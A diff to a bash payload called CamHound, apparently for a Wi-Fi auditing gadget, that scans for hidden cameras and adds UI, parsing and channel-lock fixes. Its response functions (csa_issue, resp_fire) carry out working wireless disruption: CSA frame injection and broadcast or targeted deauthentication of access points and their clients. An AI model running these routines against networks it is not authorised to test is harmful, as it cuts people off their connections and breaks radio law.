+      modules) printf -v key '%d%d%04d%03d' $((1 - kit)) $((1 - bz)) $((200 + rs > 0 ? 400 - (200 + rs) : 400)) $((999 - ${CONF[$mac]})) ;;
+      other)   printf -v key '%d%04d' $((1 - bz)) $((200 + rs > 0 ? 400 - (200 + rs) : 400)) ;;   # busy first, then loudest
+      *)       band_rank "${BANDNAME[$mac]}"; printf -v key '%d%d%03d' $((3 - RANK_V)) "$p" $((999 - ${CONF[$mac]})) ;;
+    esac
     keyed+=("$key $mac")
   done
   SORTED=()
-  local -a tmp; local i j item
-  tmp=("${keyed[@]}")
-  for ((i = 1; i < ${#tmp[@]}; i++)); do item="${tmp[i]}"; j=$((i - 1)); while (( j >= 0 )) && [[ "${tmp[j]}" > "$item" ]]; do tmp[j + 1]="${tmp[j]}"; j=$((j - 1)); done; tmp[j + 1]="$item"; done
-  for item in "${tmp[@]}"; do SORTED+=("${item#* }"); done
+  (( ${#keyed[@]} )) || return 0
+  local item
+  while read -r item; do SORTED+=("${item#* }"); done < <(printf '%s\n' "${keyed[@]}" | LC_ALL=C sort)
 }
 
 review_list() {
-  local mac last_band="" i
+  local mac last_band="" i; local -A rowseen=()
   while :; do
     sort_macs hits
     ROW_TEXT=("Resume scan"); ROW_MAC=("")
-    last_band=""
+    last_band=""; rowseen=()
     for mac in "${SORTED[@]}"; do
       if [ "${BANDNAME[$mac]}" != "$last_band" ]; then last_band="${BANDNAME[$mac]}"; ROW_TEXT+=("-- $last_band --"); ROW_MAC+=(""); fi
       row_for "$mac"
-      for i in "${ROW_TEXT[@]}"; do [ "$i" = "$ROW" ] && { ROW="${ROW:0:$((ROW_W - 5))} ${mac:13}"; break; }; done
+      # O(1) against a seen-set. This was a rescan of every previous row, so the list build was
+      # O(h^2) on top of sort_macs' own, and it is what made backing out of a card take seconds.
+      [ -n "${rowseen[$ROW]}" ] && ROW="${ROW:0:$((ROW_W - 5))} ${mac:13}"
+      rowseen[$ROW]=1
       ROW_TEXT+=("$ROW"); ROW_MAC+=("$mac")
     done
     ROW_TEXT+=("Exit"); ROW_MAC+=("")
@@ -1579,6 +1772,25 @@ modules_list() {
   for ((i = 0; i < ${#ROW_TEXT[@]}; i++)); do [ "${ROW_TEXT[i]}" = "$PICK" ] && { detail_card "${ROW_MAC[i]}" watch; break; }; done
 }
 
+other_list() {   # heard, but in neither Review hits nor the modules list - see sort_macs "other"
+  local mac i rows=0 glyph lbl r
+  sort_macs other
+  ROW_TEXT=("heard, no camera signature"); ROW_MAC=("")
+  for mac in "${SORTED[@]}"; do
+    glyph=A; [ "${ROLE[$mac]}" = cli ] && glyph=c
+    lbl="${SSID_CLEAN[$mac]}"; [ -z "$lbl" ] && lbl="${VENDOR[$mac]}"
+    case "$lbl" in ""|-) lbl="${mac//:/}" ;; esac
+    r="${RSSI_LAST[$mac]:-}"; [ -n "$r" ] && printf -v r '%d' "$r" 2>/dev/null
+    printf -v ROW '%s %s %s%s' "$glyph" "${lbl:0:$(( ROW_W - 5 - ${#r} ))}" "${PROX[$mac]:-?}" "$r"
+    [ "${BUSY[$mac]}" = 1 ] && ROW+=" busy"
+    ROW_TEXT+=("${ROW:0:$ROW_W}"); ROW_MAC+=("$mac"); rows=$((rows + 1))
+  done
+  ROW_TEXT+=("Back"); ROW_MAC+=("")
+  pick_list "[$MODE] Other devices ($rows)" "" "${ROW_TEXT[@]}" || return 0
+  case "$PICK" in "Back"|"heard, no camera signature") return 0 ;; esac
+  for ((i = 0; i < ${#ROW_TEXT[@]}; i++)); do [ "${ROW_TEXT[i]}" = "$PICK" ] && { detail_card "${ROW_MAC[i]}" watch; break; }; done
+}
+
 tag_lines() {   # tag_lines mac -> TAGTXT (one meaning per tag, max 3)
   local t n=0; TAGTXT=""
   for t in ${TAGS[$1]}; do
@@ -1604,6 +1816,7 @@ detail_card() {
     drow=""; [ "$RESPONSE" = 1 ] && drow=$(disrupt_row "$mac")
     pick_list "${CONF[$mac]} ${ID_LABEL[$mac]:-${TAGS[$mac]%% *}} ${mac:9}" "$def" "$wrow" ${drow:+"$drow"} "Locate" "Ignore for session" "Back" || return 0
     case "$PICK" in
+      "Disrupt n/a"*) LOG yellow "no associated BSS or no channel for ${mac:9}: nothing to attack from this row" ;;
       "Disrupt"*) disrupt_menu "$mac" ;;
       "Watch") watch_menu "$mac" ;;
       "Watch n/a"*) LOG "probe-only: identity + Locate only; Locate updates on probe bursts (15-60 s) and the MAC may rotate" ;;
@@ -1623,7 +1836,7 @@ mode_menu() {
 
 
 # ================================================================================ settings ===
-# Table-driven settings menu over all sixteen starred keys: key|kind|floor|group|label, where group
+# Table-driven settings menu over all eighteen starred keys: key|kind|floor|group|label, where group
 # is recon or response and settings_menu routes one page per group. Values are applied to the
 # running session and persisted with PAYLOAD_SET_CONFIG; Reset deletes the overrides and restores
 # the config-block defaults captured at start (cfg_snapshot_defaults runs before load_overrides).
@@ -1632,6 +1845,7 @@ SETTINGS_TABLE='CYCLE_SECS|int|5|recon|scan period, s
 THR_STREAM_UP|int|1|recon|STREAM big uplink fr/s
 COOLDOWN_SECS|int|0|recon|re-alert suppression, s
 DEDUPE_H|int|0|recon|dedupe horizon, h (0 off)
+RECON_FRESH|bool|0|recon|fresh Recon session at start
 RSSI_MIN|int|-100|recon|list gate dBm (0 off)
 ALERT_DIALOG|bool|0|recon|ALERT on new CONFIRMED
 SOUND|bool|0|recon|ringtone on CONFIRMED
@@ -1641,6 +1855,7 @@ BAND6|bool|0|recon|also scan 6 GHz (restored at exit)
 RESPONSE|bool|0|response|Disrupt rung (master switch)
 RESPONSE_CONFIRM|bool|0|response|confirm before any transmit
 AUTO_RESPOND|bool|0|response|funnel offers Disrupt itself
+SWEEP_TARGETED|bool|0|response|targeted deauth per member too
 RESP_LOCK_SECS|int|5|response|EXAMINE lock across a response, s
 RESP_SETTLE_SECS|int|1|response|settle before re-reading target, s
 POSTURE_TTL|int|0|response|badge cache, s (0 = re-read)'
@@ -1811,9 +2026,9 @@ bands_recover() {   # at start: a record means a previous run wrote the bands an
 
 # scan_loop: cycles until B opens Review and the operator picks Exit
 scan_loop() {
-  local rc
+  local rc btn
   set_state SCAN
-  LOG "[$MODE] scanning. B = review/pause"
+  LOG "[$MODE] scanning"
   while :; do
     run_cycle; emit_cycle
     if (( RECON_EMPTY >= 3 )); then
@@ -1825,12 +2040,24 @@ scan_loop() {
     fi
     offer_dialogs
     set_state SCAN
-    timeout "$CYCLE_SECS" WAIT_FOR_BUTTON_PRESS B >/dev/null 2>&1; rc=$?
-    if (( rc == 0 )); then
+    # The wait below is the ONLY window in which B reaches this payload; outside it the firmware
+    # owns the button and answers with "stop the payload?". The banner used to promise "B =
+    # review/pause" for the whole run, which was false whenever a cycle overran CYCLE_SECS - and
+    # while the OUI scan took minutes per cycle the window was under a tenth of the time, so B
+    # looked broken. Announce the window instead of claiming the button.
+    LOG green "press B now to review (${CYCLE_SECS}s)"
+    # Read stdout, not just rc. WAIT_FOR_BUTTON_PRESS prints the button name and exits 0 on a
+    # press - but it ALSO exits 0 on `ERROR: unknown button` and on its usage dump (both measured
+    # on the device). So rc alone cannot tell a press from a bad argument, and a mistyped button
+    # name would read as a press on every iteration and spin review_list open.
+    btn=$(timeout "$CYCLE_SECS" WAIT_FOR_BUTTON_PRESS B 2>/dev/null); rc=$?
+    if (( rc == 0 )) && [ "$btn" = B ]; then
       local t0=$EPOCHSECONDS
       review_list || return 1
       PAUSED_SECS=$((PAUSED_SECS + EPOCHSECONDS - t0))
       set_state SCAN
+    elif (( rc == 0 )); then
+      log warn "button: rc 0 but stdout was [${btn:0:40}], not B"; sleep 1
     elif (( rc != 124 )); then sleep 1; fi
   done
 }
@@ -1838,13 +2065,14 @@ scan_loop() {
 main_menu() {
   local def="Scan"
   while :; do
-    local -a menu=("Scan"); (( DEDUPE_H > 0 )) && menu+=("Scan (fresh)"); menu+=("Review hits"); [ "$SHOW_MODULES" = 1 ] && menu+=("Unidentified modules"); menu+=("Mode" "Settings" "Write report" "Exit")
+    local -a menu=("Scan"); (( DEDUPE_H > 0 )) && menu+=("Scan (fresh)"); menu+=("Review hits"); [ "$SHOW_MODULES" = 1 ] && menu+=("Unidentified modules"); [ "$SHOW_OTHER" = 1 ] && menu+=("Other devices"); menu+=("Mode" "Settings" "Write report" "Exit")
     pick_list "CamHound $VERSION [$MODE] sigs:$SIG_COUNT" "$def" "${menu[@]}" || { def="Exit"; continue; }
     case "$PICK" in
       "Scan") scan_loop || def="Exit" ;;
       "Scan (fresh)") DEDUPE_RUN=0; LOG "fresh scan: earlier runs ignored"; log mode "dedupe off for this run"; scan_loop || def="Exit" ;;
       "Review hits") review_list || def="Exit" ;;
       "Unidentified modules") modules_list ;;
+      "Other devices") other_list ;;
       "Mode") mode_menu ;;
       "Settings") settings_menu ;;
       "Write report") write_report; LOG "report: $LOOT_DIR/report_$RUN_ID.txt" ;;
@@ -1881,7 +2109,11 @@ bucket_stats() {
        END { cv = -1
          if (n >= 8) { for (i = 2; i < n; i++) { s += v[i]; k++ } m = s / k; for (i = 2; i < n; i++) ss += (v[i] - m) * (v[i] - m)
            if (m > 0) cv = int(isqrt(int(ss / (k - 1) * 100)) / m + 0.5) }
-         printf "%d %d %d %d %d %d\n", n, f, b, g, mx, cv }' "$1"
+         # %.0f, not %d: BusyBox awk casts through (int) for d/i/o/u/x/X (editors/awk.c:2418), so a
+         # byte accumulator past 2^31 is corrupted - wrapped on x86, saturated on a soft-float
+         # mipsel target. Bare print and %.0f take the long path and are exact.
+         # (No apostrophes in here: this is a single-quoted awk program and one would close it.)
+         printf "%.0f %.0f %.0f %.0f %.0f %.0f\n", n, f, b, g, mx, cv }' "$1"
 }
 
 WATCH_MAC=""; WATCH_BSSID=""; WATCH_CH=0; WATCH_ROLE=""; CAP_PIDS=""; CUR=A
@@ -1890,21 +2122,83 @@ declare -a RUNS
 # lock_target bssid secs [channel] -> 0 locked, 1 locked by channel, 2 lock failed
 LOCK_TEXT=""
 lock_target() {   # lock_target <bssid> <secs> [channel]; the channel defaults to the current Watch target's
-  local bssid="$1" secs="$2" c1 c2 c3 want="${3:-${WATCH_CH:-0}}"
+  local bssid="$1" secs="$2" c1 c2 c3 c4 raw ngood want="${3:-${WATCH_CH:-0}}"
   PINEAPPLE_EXAMINE_BSSID "$bssid" "$secs" >/dev/null 2>&1; WATCH_LOCKED=1; LAST_LOCK_TS=$EPOCHSECONDS
   sleep 0.5; c1=$(cur_channel); sleep 0.5; c2=$(cur_channel); sleep 0.5; c3=$(cur_channel)
+  raw="${c1:-_}/${c2:-_}/${c3:-_}"      # kept BEFORE the backfill: this is what the operator gets told
   LOCK_TEXT="$RECON_IF ch ${c3:-?}, target ch $want"
-  [ -z "$c3" ] && { LOCK_TEXT="$RECON_IF: no channel read-back"; return 0; }   # cannot verify: proceed
+  # rc 3, not 0: we could not read the channel back, so we do not know whether the lock took.
+  # Returning 0 here recorded lock=ok for a lock that was never verified, and LOCK_TEXT never
+  # reached the operator. Proceeding is still right -- the alternative is refusing every response
+  # on a device whose channel cannot be read -- but it must be labelled honestly in the loot.
+  [ -z "$c3" ] && { LOCK_TEXT="$RECON_IF: no channel read-back ($raw), lock unverified"; return 3; }
+  # A transient unreadable sample is not evidence of hopping. Measured on the bench 2026-11-09:
+  # c1 came back EMPTY while c2 and c3 both read 1 and the target channel WAS 1 -- the radio was
+  # parked exactly where it was asked to be -- yet the all-three-equal test below scored that
+  # "still hopping (/1/1)", returned 2, and refused the whole response (loot row LOCK_FAILED on
+  # 50:92:6a:ae:a8:82). cur_channel returns empty on a read it cannot parse, which is a missing
+  # sample, not a different channel; compare only the samples we actually got.
+  # Backfill from the LAST sample outward. c3 is known non-empty -- the rc 3 guard above returned if
+  # it was not -- so repairing c2 from c3, then c1 from the REPAIRED c2, collapses any run of
+  # unreadable samples onto the one reading we actually have. The other order copied c2 into c1
+  # before c2 itself was repaired, so with c1 AND c2 both unreadable c1 stayed empty and the
+  # all-three-equal test below scored "still hopping (/1/1)" -- character for character the bench
+  # symptom this repair was added to stop. The measured case (ONE empty sample) passed either way,
+  # which is why neither the harness nor the selftest caught it; the audit did. The selftest cases
+  # are inline below (search 'lock_target:'), not in a helper -- an earlier version of this line
+  # said "st_lock covers both" and no such function has ever existed.
+  ngood=0
+  [ -n "$c1" ] && ngood=$(( ngood + 1 ))
+  [ -n "$c2" ] && ngood=$(( ngood + 1 ))
+  [ -n "$c3" ] && ngood=$(( ngood + 1 ))
+  [ -z "$c2" ] && c2="$c3"
+  [ -z "$c1" ] && c1="$c2"
   if [ "$c1" = "$c2" ] && [ "$c2" = "$c3" ]; then
+    # ⚠ ONE readable sample cannot establish that the radio is parked, and the backfill above makes
+    # the comparison PASS on one: with c1 AND c2 unreadable the test becomes c3 = c3 = c3, a
+    # tautology carrying no stability information at all. Until 2026-11-10 that returned 0 and wrote
+    # lock=ok -- MORE confidence from LESS evidence than the two-readable-samples case beside it,
+    # which returns 3 -- inverting the contract this function states ten lines above. One sample now
+    # reports the unverified state that already exists. rc 3 still PROCEEDS, so the 2026-11-09 fix
+    # (never refuse a parked radio over a transient empty read) is intact; only the label changes,
+    # and the loot stops asserting a verification that did not happen.
+    if (( ngood < 2 )); then
+      LOCK_TEXT="$RECON_IF ch $c3 from ONE readable sample ($raw): lock unverified"
+      return 3
+    fi
     [ "$c3" = "$want" ] || [ "$want" = 0 ] && return 0
-    PINEAPPLE_EXAMINE_CHANNEL "$want" "$secs" >/dev/null 2>&1; sleep 1; c3=$(cur_channel)
-    LOCK_TEXT="locked by channel: $RECON_IF ch $c3"
-    [ "$c3" = "$want" ] && return 1
-    LOCK_TEXT="ch $c3 != $want, lock failed"; return 2
+    # The FOURTH read, which both the 2026-11-09 and 2026-11-10 repairs stopped short of: they
+    # protected c1-c3 and left this one bare, so one transient empty here still scored
+    # "ch  != 1, lock failed" -- rc 2, which refuses the whole response and transmits nothing. Same
+    # function, same cur_channel, same failure mode, and at the re-arm call site the membership
+    # capture and its dwell have already been spent by the time it fires.
+    PINEAPPLE_EXAMINE_CHANNEL "$want" "$secs" >/dev/null 2>&1; sleep 1; c4=$(cur_channel)
+    if [ -z "$c4" ]; then
+      LOCK_TEXT="$RECON_IF: no read-back after EXAMINE_CHANNEL $want, lock unverified"
+      return 3
+    fi
+    LOCK_TEXT="locked by channel: $RECON_IF ch $c4"
+    [ "$c4" = "$want" ] && return 1
+    LOCK_TEXT="ch $c4 != $want, lock failed"; return 2
   fi
-  LOCK_TEXT="$RECON_IF still hopping ($c1/$c2/$c3): lock failed"; return 2
+  # The RAW triple, not the backfilled one. The 2026-11-09 defect was diagnosable only because the
+  # log read "still hopping (/1/1)" and the empty slot was visible; printing the repaired values
+  # made that signature unreachable by construction and reported sample values that were never
+  # read. The backfill is the right input to the comparison and the wrong output to the operator.
+  LOCK_TEXT="$RECON_IF still hopping (samples $raw): lock failed"; return 2
 }
-cur_channel() { iwinfo "$RECON_IF" info 2>/dev/null | sed -n 's/.*Channel: \([0-9]*\).*/\1/p' | head -1; }
+# cur_channel: iwinfo first, then iw. iwinfo is a declared dependency but is NOT in the measured
+# device inventory (CLAUDE.md "First contact" lists tcpdump/iw/hak5cmd/scp present and does not
+# mention iwinfo); iw IS measured present. Without a fallback, an absent iwinfo or a non-numeric
+# read-back ("Channel: unknown" on a monitor interface) makes lock_target fail OPEN and report an
+# unverified lock as lock=ok -- the false-green guard this rung is built around, inert while
+# reporting healthy. The iw form is the one bands_live6 already uses.
+cur_channel() {
+  local c
+  c=$(iwinfo "$RECON_IF" info 2>/dev/null | sed -n 's/.*Channel: \([0-9]*\).*/\1/p' | head -1)
+  [ -n "$c" ] && { printf '%s' "$c"; return 0; }
+  iw dev "$RECON_IF" info 2>/dev/null | sed -n 's/.*channel \([0-9]*\) .*/\1/p' | head -1
+}
 unlock_target() { _pineap EXAMINE CANCEL >/dev/null 2>&1; PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1; WATCH_LOCKED=0; LAST_LOCK_TS=$EPOCHSECONDS; }
 
 # captures: start_caps X -> three header-only pcaps (/tmp/cs_up_X.pcap ...); stop_caps X -> TERM + wait by PID
@@ -1975,6 +2269,7 @@ watch_prepare() {
   lock_target "$WATCH_BSSID" "$secs"; rc=$?
   if (( rc == 2 )); then LOG yellow "$LOCK_TEXT"; unlock_target; set_state SCAN; return 1; fi
   (( rc == 1 )) && LOG "$LOCK_TEXT"
+  (( rc == 3 )) && LOG yellow "$LOCK_TEXT"      # proceeding, but the lock was never verified
   return 0
 }
 
@@ -2106,7 +2401,7 @@ WATCH_AGAIN=0
 
 # stimulus_test mac -> quiet gate, PROMPT, baseline/stimulus/post windows, EVENT scoring, repeats
 stimulus_test() {
-  local mac="$1" n secs ub us up delta10 asym_s rec10 i
+  local mac="$1" n secs ub us up delta10 asym_s rec10 i rc
   RUNS_N[$mac]=$(( ${RUNS_N[$mac]:-0} + 1 )); n=${RUNS_N[$mac]}
   if (( n > MAX_RUNS )); then RUNS_N[$mac]=$MAX_RUNS; LOG "max runs; move closer or try Live view"; return 0; fi
   secs=$(( WIN_BASE_S + 10 ))
@@ -2120,7 +2415,9 @@ stimulus_test() {
   done
   unlock_target
   PROMPT "Baseline ${WIN_BASE_S}s. Keep still." 2>/dev/null
-  lock_target "$WATCH_BSSID" "$secs" >/dev/null; (( $? == 2 )) && { LOG yellow "$LOCK_TEXT"; unlock_target; set_state SCAN; return 1; }
+  lock_target "$WATCH_BSSID" "$secs" >/dev/null; rc=$?
+  (( rc == 2 )) && { LOG yellow "$LOCK_TEXT"; unlock_target; set_state SCAN; return 1; }
+  (( rc == 3 )) && LOG yellow "$LOCK_TEXT"
   start_caps A; sleep "$WIN_BASE_S"; stop_caps A; window_metrics A; ub=$WM_UPRATE10; local ub_f=$WM_UF
   VIBRATE 100 2>/dev/null
   ALERT "Now move ${WIN_STIM_S}s" "walk, wave, lights" 2>/dev/null
@@ -2368,9 +2665,127 @@ resp_aggregate() {
   printf 'INCONCLUSIVE'
 }
 
+# csa_newchan -> the New Channel Number to announce, or empty when no honest answer exists.
+# A CSA naming the channel the target is already on announces no move: with mode 0 the kernel
+# discards it before reading the count (mlme.c:8351), and pagerinj refuses it outright without
+# --allow-same-chan. So auto picks a DIFFERENT channel in the same band. Deliberately a LEGAL one:
+# the open question is whether a count >= 1 denies reconnection, and that needs the client to
+# actually attempt the move. An illegal channel would confound "refused to move" with "could not".
+csa_newchan() {
+  (( CSA_CHAN > 0 )) && { printf '%s' "$CSA_CHAN"; return 0; }
+  case "$R_BAND" in
+    2) (( R_CH >= 7 )) && printf '1'  || printf '11' ;;
+    5) (( R_CH == 36 )) && printf '40' || printf '36' ;;
+    6) (( R_CH == 37 )) && printf '41' || printf '37' ;;
+    *) printf '' ;;      # band unknown: refuse to guess, the caller falls back to the firmware
+  esac
+}
+
+# csa_issue -> 0 when a CSA was issued, non-zero when nothing was. Sets CSA_CMD (what the loot
+# should name) and CSA_ERR (the diagnostic), because the two senders disagree about which signal
+# means failure:
+#   hak5cmd  exits 0 on EVERY path including its errors and writes them to stderr, so STDERR is the
+#            only signal and rc is worthless (measured 2026-11-05).
+#   pagerinj returns `failed && !sent ? 1 : 0` and prints its sent=/failed= summary to stderr even
+#            on success, so RC is the signal and testing stderr would report failure every time.
+# Getting that backwards either way files a fabricated result, which is the whole thing this rung
+# exists to prevent.
+# pagerinj reads --secs 0 as "transmit until SIGINT/SIGTERM" (its own usage, dev/injector/pagerinj.c),
+# and csa_issue runs it in the FOREGROUND, so a hand-edited CSA_INJ_SECS=0 would park resp_fire
+# forever with a transmitter running that no teardown could reach -- the watchdog and kill_children
+# only TERM pids listed in CHILD_FILE. Neither knob is starred, so the only route to a bad value is
+# a hand edit of the config block, which is exactly what "Edit these here" invites. Clamp both to a
+# finite window ONCE so the invocation and resp_fire's lock budget cannot disagree, and log it when
+# it bites rather than silently overriding what the operator wrote. Idempotent: called from both.
+# BusyBox's timeout accepts -k on recent builds and REJECTS it on older ones, and every other
+# timeout call in this payload is the bare `timeout N cmd` form -- so -k is a new syntax dependency
+# that no measurement on this device covers. An unsupported flag would make the injector fail with a
+# usage error on every single CSA, which is a worse failure than the soft bound -k exists to harden.
+# So probe once and fall back. Without -k the cap still bounds any child that honours SIGTERM, which
+# the shipped pagerinj does (it sets a flag and its nanosleep returns EINTR); what is lost is the
+# guarantee against a child that ignores it.
+TIMEOUT_K_PROBED=0; declare -a TIMEOUT_K=()
+timeout_k() {
+  (( TIMEOUT_K_PROBED )) && return 0
+  TIMEOUT_K_PROBED=1
+  if timeout -k 1 1 true >/dev/null 2>&1; then TIMEOUT_K=(-k 5)
+  else log resp "timeout has no -k: the injector cap will TERM but cannot KILL"; fi
+  return 0
+}
+
+csa_clamp() {
+  local s=$CSA_INJ_SECS w=$CSA_INJ_WAIT
+  (( CSA_INJ_SECS < 1 ))  && CSA_INJ_SECS=1
+  (( CSA_INJ_SECS > 60 )) && CSA_INJ_SECS=60
+  (( CSA_INJ_WAIT < 1 ))  && CSA_INJ_WAIT=1
+  (( CSA_INJ_WAIT > 60 )) && CSA_INJ_WAIT=60
+  [ "$s" = "$CSA_INJ_SECS" ] && [ "$w" = "$CSA_INJ_WAIT" ] && return 0
+  log resp "csa inject clamped: secs $s->$CSA_INJ_SECS wait $w->$CSA_INJ_WAIT"
+}
+
+CSA_CMD=''; CSA_ERR=''
+csa_issue() {
+  local nc rc err fw ipid
+  CSA_CMD=''; CSA_ERR=''
+  csa_clamp
+  if [ -n "$CSA_INJECTOR" ] && [ -x "$CSA_INJECTOR" ]; then
+    nc=$(csa_newchan)
+    if [ -z "$nc" ]; then
+      log resp "csa injector skipped: no band for $R_BSSID, cannot pick a new channel"
+    else
+      : >"$FIRE_ERR"
+      # Registered as a child AND capped, so both teardown paths can reach a transmitter that
+      # outlives its window: child_add puts it where the watchdog and kill_children look, and
+      # timeout bounds it even if the pid file is lost.
+      #
+      # ⚠ TWO CORRECTIONS from the 2026-11-10 audit, both of which this comment previously got
+      # wrong. (1) The cap was `+10` while resp_fire reserves `+2` of lock for this injector, so
+      # the cap could ONLY ever fire 8 s after the lock budget it was supposed to live inside had
+      # been spent -- i.e. the backstop fired exclusively in the window where the measurement that
+      # follows it is already invalid. It now uses the SAME expression as the reservation in
+      # resp_fire; if you change one, change both, and `csa_clamp` bounds the inputs of both.
+      # (2) `wait` does NOT return the child's own status here -- it returns `timeout`'s, which is
+      # 124 on expiry whatever the injector exited with (measured). The rc-is-the-signal rule for
+      # pagerinj therefore does not survive the wrapper unaltered, and the classification below is
+      # what restores it. `-k 5` is what makes the cap a real bound rather than a polite request:
+      # plain `timeout` sends SIGTERM and then waits forever on a child that ignores it.
+      timeout_k
+      timeout "${TIMEOUT_K[@]}" $(( CSA_INJ_SECS + CSA_INJ_WAIT + 2 )) \
+        "$CSA_INJECTOR" -i "$RECON_IF" --csa --bssid "$R_BSSID" --chan "$nc" \
+        --count "$CSA_COUNT" --secs "$CSA_INJ_SECS" --wait "$CSA_INJ_WAIT" \
+        >/dev/null 2>"$FIRE_ERR" &
+      ipid=$!; child_add "$ipid"; wait "$ipid"; rc=$?; child_del "$ipid"
+      err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
+      CSA_CMD="${CSA_INJECTOR##*/}:ch$nc:n$CSA_COUNT"   # expansion, not basename: one less command to exist
+      log resp "csa inject $CSA_CMD rc=$rc${err:+ out=${err:0:200}}"
+      (( rc == 0 )) && return 0
+      # rc 2 means "it DID transmit and was then capped". Distinguishing it from "it sent nothing"
+      # is not cosmetic: resp_fire's refusal path writes CMD_REFUSED, which asserts no frame left
+      # the radio, and the harness comment on that row says in as many words that CMD_REFUSED
+      # "would be a lie: a frame WAS transmitted". A capped run has pagerinj's own
+      # `interrupted: sent=N failed=0` on stderr, so the evidence is right there in `err`.
+      if (( rc == 124 )) || (( rc >= 128 )) || printf '%s' "$err" | grep -q 'sent=[1-9]'; then
+        CSA_ERR="injector capped after transmitting (rc $rc): ${err:0:160}"
+        return 2
+      fi
+      CSA_ERR="injector rc $rc: ${err:0:160}"
+      return 1
+    fi
+  fi
+  fw=$(response_cmd CSA)
+  CSA_CMD="$fw"
+  [ -n "$fw" ] && command -v "$fw" >/dev/null 2>&1 || { CSA_ERR="$fw not present"; return 1; }
+  : >"$FIRE_ERR"
+  "$fw" "$R_BSSID" "$R_CH" >/dev/null 2>"$FIRE_ERR"; rc=$?
+  err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
+  log resp "cmd $fw rc=$rc${err:+ err=${err:0:120}}"
+  (( rc == 0 )) && [ -z "$err" ] && return 0
+  CSA_ERR="${err:0:160}"; return 1
+}
+
 resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was reached
   local mac="$1" k="$2" badge="$3" cmd lock rc m p0 t0 p1 t1 present verdict nmv=0 nne=0 ninc=0 n
-  local scope tgt_verdict=- cap_secs lock_secs t_cap why
+  local scope tgt_verdict=- cap_secs lock_secs csa_secs=0 t_cap why frc ferr nmeas=0
   local -a subjects=(); local -A P0=() T0=()
   RESP_MEMBERS=(); RESP_MEMBERS_BSS=''      # never inherit a previous target's set
   cmd=$(response_cmd "$k")
@@ -2385,9 +2800,16 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
   # asymmetry that was quietly biasing the oracle: the pre-read used to run unlocked while the
   # post-read ran locked, and an unlocked read sees a hopping radio's thinner counters.
   cap_secs=0; [ "$scope" = bss ] && cap_secs=$(( CLI_CAP_SECS + 2 ))
-  lock_secs=$(( RESP_LOCK_SECS + cap_secs ))   # additive: resp_clamp_lock's floor is not ours to move
+  # The injector waits for a beacon to clone and then transmits for a while, all of it INSIDE the
+  # locked episode, so its budget has to be in the lock or the lock expires mid-fire and the
+  # post-read lands on a hopping radio -- the exact false green resp_verdict exists to prevent.
+  if [ -n "$CSA_INJECTOR" ] && [ -x "$CSA_INJECTOR" ] && { [ "$k" = CSA ] || [ "$k" = BOTH ]; }; then
+    csa_clamp                                 # before the budget, so a clamped run cannot outlast its lock
+    csa_secs=$(( CSA_INJ_SECS + CSA_INJ_WAIT + 2 ))
+  fi
+  lock_secs=$(( RESP_LOCK_SECS + cap_secs + csa_secs ))   # additive: resp_clamp_lock's floor is not ours to move
   lock_target "$R_BSSID" "$lock_secs" "$R_CH"; rc=$?
-  case $rc in 0) lock=ok ;; 1) lock=by-channel ;; *) lock=failed ;; esac
+  case $rc in 0) lock=ok ;; 1) lock=by-channel ;; 3) lock=unverified ;; *) lock=failed ;; esac
   if (( rc == 2 )); then
     unlock_target
     LOG red "lock failed: $LOCK_TEXT"; log resp "lock-failed $R_BSSID $LOCK_TEXT"
@@ -2416,31 +2838,47 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
     # the device for a full CLI_CAP_COUNT buffer (RESPONSE.md 13a-i), so any fixed number either
     # over-locks every quiet BSS or under-locks a busy one. Re-arming costs lock_target's channel
     # read-back and is exact. Measured on the air, the dwell line above is what tells us which.
-    lock_target "$R_BSSID" "$RESP_LOCK_SECS" "$R_CH"; rc=$?
-    case $rc in 0) lock=ok ;; 1) lock=by-channel ;; *) lock=failed ;; esac
+    lock_target "$R_BSSID" $(( RESP_LOCK_SECS + csa_secs )) "$R_CH"; rc=$?
+    case $rc in 0) lock=ok ;; 1) lock=by-channel ;; 3) lock=unverified ;; *) lock=failed ;; esac
     if (( rc == 2 )); then
       unlock_target
       LOG red "lock lost after the capture: $LOCK_TEXT"; log resp "lock-failed-rearm $R_BSSID $LOCK_TEXT"
       resp_write "$mac" "$badge" "$k" "$cmd" "$lock" - - LOCK_FAILED
       set_state INCONCLUSIVE; return 1
     fi
-    log resp "re-armed $R_BSSID ${RESP_LOCK_SECS}s for the measurement lock=$lock"
+    log resp "re-armed $R_BSSID $(( RESP_LOCK_SECS + csa_secs ))s for the measurement lock=$lock"
   fi
   resp_snapshot "$scope"
   for m in "${!RS_PK[@]}"; do subjects+=("$m"); P0[$m]="${RS_PK[$m]}"; T0[$m]="${RS_T[$m]}"; done
+  nmeas=${#subjects[@]}      # of the subjects, how many Recon can actually score
   if [ "$R_TARGET" = ff:ff:ff:ff:ff:ff ]; then
-    if (( ${#subjects[@]} == 0 )); then                        # nothing to disconnect, nothing to measure
+    # A heard station is a TARGET even when it is not a SUBJECT, and conflating the two was a real
+    # defect: measuring a device needs a Recon row and an address stable enough to compare across
+    # the fire, but TRANSMITTING at it needs neither -- the frame carries an address, not a
+    # baseline. Until 2026-11-09 `subjects` was both sets at once, so an AP whose only client was a
+    # randomised-MAC phone refused with NO_MATCH and sent NOTHING. Measured on the bench, seven
+    # consecutive attempts on fc:58:5a:08:42:15: `resp members ... n=1 why=ok ... recs=286..468`
+    # (the capture heard the station, zero short/trunc/runt) followed by `refused ... NO_MATCH
+    # members=1`, with pk_before and pk_after both '-' in every loot row -- while the GUI's AP-row
+    # deauth, which is the SAME opcode-400 broadcast frame this function would have sent, dropped
+    # that client on demand. The measurement gate was gating the transmit.
+    # These members get p0 '-', so resp_verdict returns INCONCLUSIVE for them rather than inventing
+    # a verdict -- the honest answer for a device we disconnected but cannot score.
+    if [ "$RESP_MEMBERS_BSS" = "$R_BSSID" ]; then
+      for m in "${!RESP_MEMBERS[@]}"; do
+        [ "$m" = ff:ff:ff:ff:ff:ff ] && continue
+        [ -n "${P0[$m]+x}" ] && continue          # already a measurable subject
+        subjects+=("$m"); P0[$m]=-; T0[$m]=-
+      done
+    fi
+    if (( ${#subjects[@]} == 0 )); then     # heard nobody AND can measure nobody: nothing to aim at
